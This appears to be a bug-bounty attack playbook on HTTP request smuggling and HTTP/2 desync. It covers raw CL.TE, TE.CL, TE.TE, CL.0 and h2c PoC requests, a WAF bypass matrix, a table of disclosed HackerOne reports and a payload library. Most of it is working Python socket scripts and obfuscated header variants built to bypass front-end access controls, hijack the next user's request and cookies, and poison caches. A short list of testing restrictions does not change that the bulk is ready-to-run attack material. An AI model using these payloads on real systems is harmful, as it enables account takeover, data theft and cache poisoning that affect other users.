# HTTP Request Smuggling / HTTP/2 Desync

> Perspective: black-box; the goal is to exploit parsing discrepancies between the front-end and back-end

## 1. In one sentence

The front-end proxy (CDN / WAF / Nginx) and the back-end server parse `Content-Length` / `Transfer-Encoding` inconsistently →
the attacker stuffs a "half packet" into the stream, affecting the next user's request/response.
SRC value: a successful desync = P1/P0 ($2k–$10k+).

---

## 2. Type overview

| Type | Front-end proxy uses | Back-end uses |
|------|----------|------|
| **CL.TE** | Content-Length | Transfer-Encoding |
| **TE.CL** | Transfer-Encoding | Content-Length |
| **TE.TE** | both look at it, but front/back processing is confused | same |
| **HTTP/2 → HTTP/1 desync** | h2 | h1 back-end |
| **CL.0** | CL=0 the back-end ignores | back-end reads body |

---

## 3. Probing techniques

### 3.1 Tools

```bash
# Burp extension
HTTP Request Smuggler

# Command line
smuggler.py -u https://target -v
http2smugl quirks --target target.com:443
h2csmuggler -u https://target/ --path /admin
```

### 3.2 Classic PoCs

#### CL.TE

```
POST / HTTP/1.1
Host: victim
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

The front-end reads `0\r\n\r\nG` per CL=6; the back-end sees `0\r\n\r\n` as the end per chunked, and the remaining `G` enters the next request.

#### TE.CL

```
POST / HTTP/1.1
Host: victim
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
...
0

```

#### Double CL

```
POST / HTTP/1.1
Host: victim
Content-Length: 4
Content-Length: 1

GPOST...
```

#### CL.0 (common with HTTP/2)

The back-end ignores CL (treating POST as GET), the front-end takes the body per CL → smuggling.

#### h2c smuggling

```bash
h2csmuggler -u http://target/ --path /admin
# Uses HTTP/1.1 → HTTP/2 upgrade to disable the front-end proxy
```

---

## 4. Bypass matrix

| Blocked by | Bypass |
|---|---|
| Standard CL/TE detection | TE casing: `Transfer-encoding`, `transfer-Encoding` |
| TE blocking | trailing space on TE: `Transfer-Encoding : chunked` |
| WAF detection | TE value mangling: `chunked`, `chunked,gzip`, `xchunked` |
| Standard chunk blocking | stuff data after a 0-size chunk |
| h2 disabled | h2c upgrade |

---

## 5. Exploitation for escalation / lateral

```
1. Cache poisoning: make the proxy cache a malicious response under another URL
2. Cross-user access: "lend" the response of an admin endpoint to the next user
3. Bypass IP restrictions: smuggle past IP validation
4. Steal secrets: mix someone else's request + your own response
5. XSS (caching a smuggled response)
```

---

## 6. Real-case fingerprints

- PortSwigger blog series (James Kettle)
- Cloudflare / Akamai multiple disclosures
- Desync reports on HackerOne H1 $5k–$30k

Common fingerprints:
- Send 2 requests over the same connection; the 2nd response "looks like it belongs to another request"
- Occasional 503 / 502 / abnormal status codes
- Proxy log and back-end log request counts do not match

---

## 7. Reproduction / evidence essentials

### 7.1 PoC

```
# Send the following packet in Burp Repeater raw mode (preserve CRLF)
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0\r\n\r\nG

# Immediately the second request (same connection, same Burp Repeater tab)
GET / HTTP/1.1
Host: target.com

→ The second response should reflect the 'G' prefix smuggled previously
```

### 7.2 CVSS

```
HTTP smuggling → cache poisoning       = 8.1 High
HTTP smuggling → auth bypass           = 9.1 Critical
HTTP smuggling → cross-user            = 8.1 High
```

---

## 8. Things not to do

- **Forbidden**: performing high-traffic desync testing in production (affects others' requests). Low-rate, single-run validation.
- **Forbidden**: caching a smuggled malicious response into a site-wide shared path (other users would be affected). Demonstrate on your own cache key.
- **Forbidden**: actually stealing others' cookies / tokens. Stop as soon as you observe the desync phenomenon.

## H1 real cases

_A total of 38 disclosed HackerOne High/Critical reports hit this category, sorted by (bounty + votes×100), taking the Top 12_

| Severity | $ | Program | Title (click for the original report) | Summary |
|---|--:|---|---|---|
| High | 20000 usd | PayPal | [Bypass for #488147 enables stored XSS on https://paypal.com/signin again](https://hackerone.com/reports/510152) | Bypass for #488147 enables stored XSS on https://paypal.com/signin again |
| High | 18900 usd | PayPal | [Stored XSS on https://paypal.com/signin via cache poisoning](https://hackerone.com/reports/488147) | Stored XSS on https://paypal.com/signin via cache poisoning |
| Critical | — | Slack | [Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies](https://hackerone.com/reports/737140) | Hi Slack Security Team! My name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a mon… |
| High | — | LY Corporation | [Request smuggling on admin-official.line.me could lead to account takeover](https://hackerone.com/reports/740037) | Request smuggling on admin-official.line.me could lead to account takeover |
| Critical | — | Eternal | [Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com](https://hackerone.com/reports/771666) | Intro Hi Zomato Security Team! My name is Evan Custodio and this is my first time evaluating your platform. I specialize in loo… |
| Critical | 7500 usd | Basecamp | [HTTP Request Smuggling via HTTP/2](https://hackerone.com/reports/1211724) | HTTP Request Smuggling via HTTP/2 |
| High | — | Helium | [HTTP request Smuggling](https://hackerone.com/reports/867952) | When malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web … |
| Critical | 6000 usd | Cloudflare Public Bug Bounty | [HTTP Request Smuggling in Transform Rules using hexadecimal escape sequences in the concat() func…](https://hackerone.com/reports/1478633) | HTTP Request Smuggling in Transform Rules using hexadecimal escape sequences in the concat() function |
| High | 750 usd | GSA Bounty | [HTTP Request Smuggling on https://labs.data.gov](https://hackerone.com/reports/726773) | Greetings, The application appears to be vulnerable to HTTP request smuggling due to a disagreement between the front-end and b… |
| High | 4660 usd | Internet Bug Bounty | [Possibility of Request smuggling attack](https://hackerone.com/reports/2280391) | Request smuggling was possible by throwing an IOException with the upper size limit of the trailer header |
| High | — | Node.js | [HTTP Request Smuggling due to CR-to-Hyphen conversion](https://hackerone.com/reports/922597) | NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, th… |
| Critical | 5000 usd | Aiven Ltd | [Grafana RCE via SMTP server parameter injection](https://hackerone.com/reports/1200647) | Summary: This report is similar to #1180653, except with different parameter injection entrypoint |

**Weakness distribution for hits in this category:**

- HTTP Request Smuggling: 27 entries
- CRLF Injection: 5 entries
- Uncategorized → manually classified: 4 entries
- HTTP Response Splitting: 2 entries

## Payload library

_4 structured web payloads, including full attack chains + WAF/EDR bypass variants_

### CL-TE request smuggling  `smuggling-cl-te`
Content-Length vs Transfer-Encoding smuggling
Sub-category: **CL-TE** · tags: `smuggling` `request` `http`

**Prerequisites:** the target uses multi-layer proxies; front/back-end processing differences

**Attack chain:**

**1. CL-TE basic**
_CL-TE smuggling_
```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**2. TE-CL basic**
_TE-CL smuggling_
```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

**3. TE-TE**
_TE-TE smuggling_
```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: x

0

SMUGGLED
```

**WAF/EDR bypass variants:**

**1. TE header obfuscation variants**
_By adding spaces, tabs, newlines, multiple headers, spelling variants, etc. to the Transfer-Encoding header to make the front-end and back-end proxies parse it differently, triggering request smuggling_
```
# TE header obfuscation (makes front/back-end parse TE inconsistently):
Transfer-Encoding: chunked

Transfer-Encoding : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

X: x
Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

**2. Chunked extension field combined with CL-TE**
_Uses the extension field of HTTP chunked encoding (content after the semicolon) to interfere with parsing, or uses the CL-0 trick to make the front-end think the request has no body while the back-end continues processing the smuggled second request_
```
# Chunked extension field (RFC-allowed extension after the semicolon):
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0;ext="injected"

G

# CL-0 smuggling:
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

GET /admin HTTP/1.1
Host: target.com
```

---

### CL-CL smuggling  `smuggling-cl-cl`
Uses the fact that the front-end proxy and back-end server both process the Content-Length header but handle multiple CL headers differently to achieve HTTP request smuggling
Sub-category: **CL-CL** · tags: `smuggling` `cl-cl` `http`

**Prerequisites:** a front-end proxy (e.g. HAProxy/Nginx) + back-end server architecture exists; the two ends parse the Content-Length header differently; understanding of HTTP request smuggling principles

**Attack chain:**

**1. Detect CL-CL smuggling conditions**  _[linux]_
_Probe whether the target has a double-CL smuggling condition_
```
# Detect the front-end proxy type:
curl -sI "http://target.com/" | grep -iE "server:|via:|x-forwarded"

# Send a request containing two Content-Length headers:
curl -v "http://target.com/"   -H "Content-Length: 6"   -H "Content-Length: 0"   -d "test12"

# Observe the response:
# - if it returns normally: possibly only one CL was parsed
# - if 400/error: the server rejects multiple CL (safe)
# - if partially processed: smuggling is possible
```

**2. CL-CL request smuggling PoC**
_Craft a smuggling request containing two Content-Length headers to inject a malicious request into the back-end processing queue_
```
# Python PoC - CL-CL smuggling
import socket

def smuggle_cl_cl(host, port):
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 44\r\n"   # the front-end uses this CL
        "Content-Length: 0\r\n"    # the back-end uses this CL
        "\r\n"
        "GET /admin HTTP/1.1\r\n"  # the smuggled request
        f"Host: {host}\r\n"
        "\r\n"
    )
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096).decode(errors="ignore")
    print(resp)
    s.close()

smuggle_cl_cl("target.com", 80)
```

**3. Use CL-CL smuggling to bypass front-end access control**
_Use CL-CL smuggling to bypass the front-end proxy's ACL access restriction to reach /admin_
```
# Scenario: the front-end restricts /admin access; bypass it via smuggling
import socket

def bypass_acl(host, port):
    # Smuggle a request to the /admin endpoint
    smuggled = (
        "GET /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    )
    content_length_real = len(smuggled)
    
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {content_length_real}\r\n"
        "Content-Length: 0\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        + smuggled
    )
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    # Receive two responses
    resp = s.recv(8192).decode(errors="ignore")
    print("[Response 1 - Normal]")
    print(resp[:500])
    resp2 = s.recv(8192).decode(errors="ignore")
    print("[Response 2 - Smuggled /admin]")
    print(resp2[:500])
    s.close()

bypass_acl("target.com", 80)
```

**WAF/EDR bypass variants:**

**1. HTTP/2 downgrade bypass**
_Uses the request-boundary parsing inconsistency between front-end and back-end during HTTP/2-to-HTTP/1.1 protocol downgrade to achieve smuggling_
```
# HTTP/2 -> HTTP/1.1 downgrade exploitation
# Smuggling when the front-end is H2 and the back-end is H1
:method: POST
:path: /
:authority: target.com
content-length: 0

GET /admin HTTP/1.1
Host: target.com

# H2C upgrade smuggling
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: <base64>
Connection: Upgrade, HTTP2-Settings
```

**2. Connection-reuse manipulation**
_Smuggles requests in the proxy chain via double Content-Length header value differences and keep-alive connection reuse_
```
# Double CL value difference
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Content-Length: 50

12345GPOST /admin HTTP/1.1
Host: target.com

# Using keep-alive connection reuse
GET / HTTP/1.1
Host: target.com
Connection: keep-alive
Content-Length: 0

GET /admin HTTP/1.1
Host: internal.target.com
```

**3. Proxy-chain confusion**
_Uses the difference in how multi-tier proxies handle spaces and colons in the Content-Length header to achieve request smuggling_
```
# Multi-tier proxy CL processing difference
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Content-Length : 0

GET /admin HTTP/1.1
Host: target.com
X: 1

# Space-obfuscated CL header
POST / HTTP/1.1
Host: target.com
 Content-Length: 0
Content-Length: 42

GET /internal HTTP/1.1
Host: target.com
```

---

### TE-CL smuggling  `smuggling-te-cl`
Uses the difference where the front-end uses Transfer-Encoding while the back-end uses Content-Length to achieve HTTP request smuggling
Sub-category: **TE-CL** · tags: `smuggling` `te-cl` `http`

**Prerequisites:** the front-end proxy prioritizes Transfer-Encoding; the back-end server prioritizes Content-Length; understanding of the chunked encoding format

**Attack chain:**

**1. Detect the TE-CL difference**
_Detect the priority difference between front-end and back-end for TE vs CL_
```
# Send a request containing both TE and CL:
curl -v "http://target.com/"   -H "Transfer-Encoding: chunked"   -H "Content-Length: 3"   -d "0

"

# Use timing detection:
# If the back-end uses CL, it will wait for more data (timeout)
import socket, time

s = socket.socket()
s.connect(("target.com", 80))
payload = (
    "POST / HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Length: 6\r\n"
    "\r\n"
    "0\r\n\r\n"
)
s.send(payload.encode())
start = time.time()
resp = s.recv(4096)
elapsed = time.time() - start
print(f"Response in {elapsed:.2f}s")
# Fast response = back-end uses TE, delayed response = back-end uses CL
```

**2. TE-CL smuggling PoC**
_TE-CL smuggling: the front-end forwards the whole body per chunked, the back-end reads only part per CL, and the remainder becomes a smuggled request_
```
import socket

def te_cl_smuggle(host, port):
    # Front-end (TE): reads until "0\r\n\r\n" as the end → the whole payload is one request
    # Back-end (CL): reads only the bytes specified by Content-Length → remaining bytes are a new request
    
    smuggled = "GET /admin HTTP/1.1\r\nHost: {}\r\n\r\n".format(host)
    
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "{}\r\n"
        "{}"
        "0\r\n\r\n"
    ).format(host, format(len(smuggled), "x"), smuggled)
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096)
    print(resp.decode(errors="ignore")[:500])
    s.close()

te_cl_smuggle("target.com", 80)
```

**3. TE-CL smuggling to hijack requests**
_Smuggle an incomplete POST request so that the next user's request content (including Cookie) is reflected into the search results_
```
# Use smuggling to hijack the next user's request
import socket

def hijack_request(host, port):
    # Smuggle an incomplete POST request
    # The next legitimate user's request gets concatenated as this POST's body
    smuggled = (
        "POST /search HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 200\r\n"  # a large CL will swallow the next request
        "\r\n"
        "q="  # the next request's data will be treated as the search parameter
    ).format(host)
    
    chunk_size = format(len(smuggled), "x")
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "{}\r\n"
        "{}"
        "0\r\n\r\n"
    ).format(host, chunk_size, smuggled)
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    print(s.recv(4096).decode(errors="ignore")[:500])
    s.close()

hijack_request("target.com", 80)
```

**WAF/EDR bypass variants:**

**1. TE header casing variant bypass**
_Uses the difference in how different proxies handle Transfer-Encoding header name casing and value to bypass TE-CL smuggling detection_
```
# TE header casing obfuscation
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: identity

5c
GPOST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

# Transfer-Encoding variants
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
```

**2. Whitespace injection**
_Inject tabs, leading spaces, and CRLF characters into the Transfer-Encoding header so different proxies parse it differently_
```
# Tab/newline injection into the TE header
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding:\tchunked

# Leading-space obfuscation
POST / HTTP/1.1
Host: target.com
Content-Length: 4
 Transfer-Encoding: chunked

# CRLF injection variant
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked\x0d\x0aX-Ignore: x
```

**3. Chunk extension field exploitation**
_Uses the chunk-extension field in HTTP chunked transfer and non-standard chunk-size formats to cause front/back-end parsing differences_
```
# Chunk extension obfuscation
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5;ext=val
hello
0

# Overly long chunk extension
5;aaaaaaa...aaaa=bbbb...bbb
hello
0

# Invalid chunk-size format
 5
hello
0

# 0x prefix
0x5
hello
0
```

---

### TE-TE smuggling  `smuggling-te-te`
Uses the difference in how front-end and back-end handle different obfuscation variants of the Transfer-Encoding header to achieve request smuggling
Sub-category: **TE-TE** · tags: `smuggling` `te-te` `http`

**Prerequisites:** both front-end and back-end support Transfer-Encoding; you can obfuscate the TE header to make one end ignore TE; understanding of chunked encoding and HTTP smuggling principles

**Attack chain:**

**1. TE obfuscation variant probing**
_Test various Transfer-Encoding obfuscation variants to find front/back-end parsing differences_
```
# Various obfuscated ways to write Transfer-Encoding:
# Test which obfuscation makes one end ignore TE
import socket

te_variants = [
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding : chunked",     # space before the colon
    "Transfer-Encoding: chunked\r\nTransfer-encoding: cow",  # two TE
    "Transfer-Encoding\t: chunked",    # Tab separator
    "Transfer-Encoding: \tchunked",    # Tab prefix
    " Transfer-Encoding: chunked",     # leading space
    "X: x\r\nTransfer-Encoding: chunked",  # header injection
    "Transfer-Encoding: chunked ",  # null byte
]

for i, te in enumerate(te_variants):
    print(f"[{i}] Testing: {te[:60]}")
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: target.com\r\n"
        f"{te}\r\n"
        "Content-Length: 5\r\n"
        "\r\n"
        "0\r\n\r\n"
    )
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect(("target.com", 80))
        s.send(payload.encode())
        resp = s.recv(1024).decode(errors="ignore")
        status = resp.split("\r\n")[0] if resp else "No response"
        print(f"    → {status}")
        s.close()
    except Exception as e:
        print(f"    → Error: {e}")
```

**2. TE-TE smuggling exploitation (front-end ignores the obfuscated TE)**
_Uses TE header obfuscation so one end processes per CL and the other per TE, achieving smuggling_
```
import socket

def te_te_smuggle(host, port, te_header):
    # Front-end does not recognize the obfuscated TE → uses CL
    # Back-end recognizes the obfuscated TE → uses chunked
    
    smuggled = "GET /admin HTTP/1.1\r\nHost: {}\r\n\r\n".format(host)
    
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Length: {}\r\n"
        "{}\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "{}"
    ).format(
        host,
        len("0\r\n\r\n" + smuggled),
        te_header,
        smuggled
    )
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096)
    print(resp.decode(errors="ignore")[:500])
    s.close()

# Use a discovered effective obfuscation variant:
te_te_smuggle("target.com", 80, "Transfer-Encoding: chunked\r\nTransfer-encoding: cow")
```

**3. TE-TE cache poisoning attack**
_Uses TE-TE smuggling to achieve a web cache poisoning attack_
```
import socket

def cache_poison_via_smuggling(host, port):
    # Achieve cache poisoning via smuggling:
    # The smuggled request points to a static resource but contains a malicious response header/content
    
    smuggled = (
        "GET /static/main.js HTTP/1.1\r\n"
        "Host: {}\r\n"
        "\r\n"
    ).format(host)
    
    # Send the smuggling request first
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Length: {}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-encoding: x\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "{}"
    ).format(host, len("0\r\n\r\n" + smuggled), smuggled)
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096)
    print("[*] Cache poisoned")
    print(resp.decode(errors="ignore")[:300])
    s.close()

cache_poison_via_smuggling("target.com", 80)
```

**WAF/EDR bypass variants:**

**1. Multiple TE header obfuscation**
_Send multiple Transfer-Encoding headers or comma-separated multiple values, exploiting the front/back-end priority difference for multi-value TE headers_
```
# Multiple Transfer-Encoding headers
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding: chunked

# Comma-separated multiple values
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked

# Mixed valid/invalid values
Transfer-Encoding: chunked
Transfer-Encoding: cow
Transfer-Encoding: chunked
```

**2. Non-standard TE value obfuscation**
_Use non-standard or tampered Transfer-Encoding values to make the front-end proxy fall back to CL while the back-end still parses it as chunked_
```
# Junk TE value makes some proxies ignore TE
Transfer-Encoding: xchunked
Transfer-Encoding: chunked-false
Transfer-Encoding: chunk
Transfer-Encoding: CHUNKED

# Quote-wrapped
Transfer-Encoding: "chunked"

# Parameter appended
Transfer-Encoding: chunked; q=0.5
Transfer-Encoding: chunked, x

# Encoding obfuscation
Transfer-\x45ncoding: chunked
```

**3. Proxy-specific parsing bypass**
_Send customized smuggling payloads targeting the TE header parsing characteristics of specific proxies/servers (HAProxy/Apache/Nginx)_
```
# HAProxy-specific bypass
POST / HTTP/1.1
Host: target.com
Transfer-Encoding:[\x0b]chunked

# Apache-specific bypass
POST / HTTP/1.1
Host: target.com
Transfer-Encoding:\x00chunked

# Nginx-specific bypass
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked\x20

# Generic trailing whitespace
Transfer-Encoding: chunked
```

---
